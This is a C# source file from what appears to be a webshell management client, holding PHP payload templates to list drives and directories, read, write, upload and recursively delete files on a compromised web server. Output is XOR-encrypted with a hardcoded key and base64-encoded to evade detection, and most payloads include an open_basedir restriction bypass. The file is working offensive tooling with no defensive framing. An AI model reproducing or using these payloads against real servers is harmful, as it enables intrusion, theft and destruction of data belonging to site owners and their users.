using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WpfApp1.Payload.php.xor
{
    public class FileOut
    {
        /// <summary>
        /// 获取盘符payload
        /// </summary>
        /// <returns></returns>
        public string FIleDrive()
        {
            string Drive = @$"ob_start();try{{$D=dirname($_SERVER[""SCRIPT_FILENAME""]);if($D=="""")$D=dirname($_SERVER[""PATH_TRANSLATED""]);if(substr($D,0,1)!=""/""){{ foreach (range(""C"", ""Z"") as $L)if (is_dir(""{{$L}}:""))$R.=""{{$L}}:"";}}else {{$R.= ""/"";}};echo Encrypt($R);}}catch(Exception $e){{echo ""ERROR://"".$e->getMessage();}}; die();
function Encrypt($data) {{
	$key=""e45e329feb5d925b"";
	for ($i=0;$i<strlen($data);$i++) {{
		$data[$i] = $data[$i]^$key[$i+1&15];
	}}
	$bs=""base64_"".""encode"";
	$after=$bs($data."""");
	return $after;
}}";
            return Drive;
        }
        /// <summary>
        /// 获取文件列表payload
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public string FileDir(string path)
        {
            string Dir = $@"@ini_set(""display_errors"", ""0"");
@set_time_limit(0);
$path=""{path}"";
$path=base64_decode($path);
$F=scandir($path);
if($F==NULL){{echo(""ERROR:// Path Not Found Or No Permission!"");}}else{{$tmparr = array();foreach ($F as $value){{if($value != '.' && $value != '..'){{$P =$path.""/"".$value;$T = date(""Y-m-d H:i:s"", filemtime($P));$E= substr(base_convert(fileperms($P), 10, 8), -4);$arr = array(""time"" => $T, ""size"" => filesize($P), ""root"" => $E, ""path"" =>urlencode(is_dir($P) ?$value.""/"":$value));$tmparr[] = $arr;}}}};echo Encrypt(json_encode($tmparr));}}
function Encrypt($data) {{
	$key=""e45e329feb5d925b"";
	for ($i=0;$i<strlen($data);$i++) {{
		$data[$i] = $data[$i]^$key[$i+1&15];
	}}
	$bs=""base64_"".""encode"";
	$after=$bs($data."""");
	return $after;
}}";

            return Dir;
        }

        /// <summary>
        /// 查看文件内容payload
        /// </summary>
        /// <returns></returns>
        public string ViewFile(string path)
        {
            string ViewFile = @$"
@ini_set(""display_errors"", ""0"");
@set_time_limit(0);
$opdir=@ini_get(""open_basedir"");
if($opdir) {{
	$ocwd=dirname($_SERVER[""SCRIPT_FILENAME""]);
	$oparr=preg_split(""/;|:/"",$opdir);
	@array_push($oparr,$ocwd,sys_get_temp_dir());
	foreach($oparr as $item) {{
		if(!@is_writable($item)) {{
			continue;
		}}
		;
		$tmdir=$item.""/.f20779639"";
		@mkdir($tmdir);
		if(!@file_exists($tmdir)) {{
			continue;
		}}
		@chdir($tmdir);
		@ini_set(""open_basedir"", "".."");
		$cntarr=@preg_split(""/\\\\|\//"",$tmdir);
		for ($i=0;$i<sizeof($cntarr);$i++) {{
			@chdir("".."");
		}}
		;
		@ini_set(""open_basedir"",""/"");
		@rmdir($tmdir);
		break;
	}}
	;
}}
function Encrypt($data)
{{
    $key = ""e45e329feb5d925b""; 
    for ($i = 0; $i < strlen($data); $i++) {{
        $data[$i] = $data[$i] ^ $key[$i + 1 & 15];
    }}
    $bs = ""base64_"" . ""encode"";
    $after = $bs($data . """");
    return $after;
}};
function asenc($out) {{

    return base64_encode($out);
}}
;
function asoutput() {{
	$output=ob_get_contents();
	ob_end_clean();
	echo @asenc($output);
}}
ob_start();
try {{
    $F = (base64_decode(""{path}""));
    $P = @fopen($F, ""r"");
    echo(@fread($P, filesize($F) ? filesize($F) : 4096));
    @fclose($P);

}}
catch(Exception $e) {{
	echo ""ERROR://"".$e->getMessage();
}}
;

asoutput();

die();";
            return ViewFile;
        }

        /// <summary>
        /// 修改文件内容 or 新建文件
        /// </summary>
        /// <returns></returns>
        public string WriteFile(string path, string content)
        {
            string WriteFile = @$"header(""Content-Type: text/plain; charset=utf-8"");@ini_set(""display_errors"", ""0"");
@set_time_limit(0);
$opdir = @ini_get(""open_basedir"");
if ($opdir) {{
    $ocwd = dirname($_SERVER[""SCRIPT_FILENAME""]);
    $oparr = preg_split(""/;|:/"", $opdir);
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    foreach ($oparr as $item) {{
        if (!@is_writable($item)) {{
            continue;
        }}
        $tmdir = $item . ""/.56a5af"";
        @mkdir($tmdir);
        if (!@file_exists($tmdir)) {{
            continue;
        }}
        @chdir($tmdir);
        @ini_set(""open_basedir"", "".."");
        $cntarr = @preg_split(""/\\\\|\//"", $tmdir);
        for ($i = 0; $i < sizeof($cntarr); $i++) {{
            @chdir("".."");
        }}
        @ini_set(""open_basedir"", ""/"");
        @rmdir($tmdir);
        break;
    }}
}}
function getSafeStr($str) {{
    $s1 = iconv('utf-8', 'gbk//IGNORE', $str);
    $s0 = iconv('gbk', 'utf-8//IGNORE', $s1);
    if ($s0 == $str) {{
        return $s0;
    }} else {{
        return iconv('gbk', 'utf-8//IGNORE', $str);
    }}
}};
function Encrypt($data)
{{
    $key = ""e45e329feb5d925b"";
    for ($i = 0; $i < strlen($data); $i++) {{
        $data[$i] = $data[$i] ^ $key[$i + 1 & 15];
    }}
    $bs = ""base64_"" . ""encode"";
    $after = $bs($data . """");
    return $after;
}}

function asenc($out) {{
    return Encrypt($out);
}}

function asoutput() {{
    $output = ob_get_contents();
    ob_end_clean();
    echo @asenc($output);
}}

ob_start();
try {{
    $path = base64_decode(""{path}""); 
    $content = base64_decode(""{content}"");
    echo @fwrite(fopen($path, ""w""),$content) ? ""1"" : ""0"";
}} catch (Exception $e) {{
    echo ""ERROR://"" . $e->getMessage();
}}

asoutput();
die();";
            return WriteFile;
        }

        /// <summary>
        /// 删除文件payload
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public string DelFile(string path)
        {
            string del = $@"@ini_set(""display_errors"", ""0"");
@set_time_limit(0);
$opdir=@ini_get(""open_basedir"");
if($opdir) {{
	$ocwd=dirname($_SERVER[""SCRIPT_FILENAME""]);
	$oparr=preg_split(""/;|:/"",$opdir);
	@array_push($oparr,$ocwd,sys_get_temp_dir());
	foreach($oparr as $item) {{
		if(!@is_writable($item)) {{
			continue;
		}}
		;
		$tmdir=$item.""/.c476abaf"";
		@mkdir($tmdir);
		if(!@file_exists($tmdir)) {{
			continue;
		}}
		@chdir($tmdir);
		@ini_set(""open_basedir"", "".."");
		$cntarr=@preg_split(""/\\\\|\//"",$tmdir);
		for ($i=0;$i<sizeof($cntarr);$i++) {{
			@chdir("".."");
		}}
		;
		@ini_set(""open_basedir"",""/"");
		@rmdir($tmdir);
		break;
	}}
	;
}}
;
;
function Encrypt($data)
{{
    $key = ""e45e329feb5d925b"";
    for ($i = 0; $i < strlen($data); $i++) {{
        $data[$i] = $data[$i] ^ $key[$i + 1 & 15];
    }}
    $bs = ""base64_"" . ""encode"";
    $after = $bs($data . """");
    return $after;
}};
function asenc($out) {{
	return $out;
}}
;
function asoutput() {{
	$output=ob_get_contents();
	ob_end_clean();
	echo @asenc($output);
}}
ob_start();
try {{
	function df($p) {{
		$m=@dir($p);
		while(@$f=$m->read()) {{
			$pf=$p.""/"".$f;
			if((is_dir($pf))&&($f!=""."")&&($f!="".."")) {{
				@chmod($pf,0777);
				df($pf);
			}}
			if(is_file($pf)) {{
				@chmod($pf,0777);
				@unlink($pf);
			}}
		}}
		$m->close();
		@chmod($p,0777);
		return @rmdir($p);
	}}
	$F=base64_decode(get_magic_quotes_gpc()?stripslashes(""{path}""):""{path}"");
	if(is_dir($F))echo(df($F)); else {{
		echo(Encrypt(file_exists($F)?@unlink($F)?""1"":""0"":""0""));
	}}
	;
}}
catch(Exception $e) {{
	echo ""ERROR://"".$e->getMessage();
}}
;
asoutput();
die();";
            return del;
        }

        /// <summary>
        /// 上传文件payload
        /// </summary>
        /// <returns></returns>
        public string UploadFile(string path, string content)
        {
            string UploadFile = @$"@ini_set(""display_errors"", ""0"");
@set_time_limit(0);
$opdir=@ini_get(""open_basedir"");
if($opdir) {{
	$ocwd=dirname($_SERVER[""SCRIPT_FILENAME""]);
	$oparr=preg_split(""/;|:/"",$opdir);
	@array_push($oparr,$ocwd,sys_get_temp_dir());
	foreach($oparr as $item) {{
		if(!@is_writable($item)) {{
			continue;
		}}
		;
		$tmdir=$item.""/.3af1aa881c"";
		@mkdir($tmdir);
		if(!@file_exists($tmdir)) {{
			continue;
		}}
		@chdir($tmdir);
		@ini_set(""open_basedir"", "".."");
		$cntarr=@preg_split(""/\\\\|\//"",$tmdir);
		for ($i=0;$i<sizeof($cntarr);$i++) {{
			@chdir("".."");
		}}
		;
		@ini_set(""open_basedir"",""/"");
		@rmdir($tmdir);
		break;
	}}
	;
}}
;
;
function Encrypt($data)
{{
    $key = ""e45e329feb5d925b"";
    for ($i = 0; $i < strlen($data); $i++) {{
        $data[$i] = $data[$i] ^ $key[$i + 1 & 15];
    }}
    $bs = ""base64_"" . ""encode"";
    $after = $bs($data . """");
    return $after;
}};
function asenc($out) {{
	return $out;
}}
;
function asoutput() {{
	$output=ob_get_contents();
	ob_end_clean();
	echo @asenc($output);
}}
ob_start();
try {{
	$f=base64_decode(""{path}"");
	$c=base64_decode(""{content}"");
	$c=str_replace(""\r"","""",$c);
	$c=str_replace(""\n"","""",$c);
	$buf="""";
	for ($i=0;$i<strlen($c);$i+=2)$buf.=urldecode(""%"".substr($c,$i,2));
	echo(Encrypt(@fwrite(fopen($f,""a""),$buf)?""1"":""0""));
	;
}}
catch(Exception $e) {{
	echo ""ERROR://"".$e->getMessage();
}}
;
asoutput();
die();";
            return UploadFile;
        }



    }
}
